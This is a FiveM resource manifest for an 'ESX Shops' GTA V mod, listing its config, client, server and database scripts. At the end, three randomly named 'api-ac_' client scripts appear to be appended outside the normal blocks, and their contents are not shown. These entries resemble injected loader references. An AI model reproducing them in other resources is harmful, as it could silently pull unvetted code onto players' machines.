fx_version "bodacious"

games {"gta5"}
lua54 'yes'
--
description 'ESX Shops'

version '1.1.0'

client_scripts {
	'config.lua',
	'client/main.lua'
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'config.lua',
	'server/main.lua'
}


client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"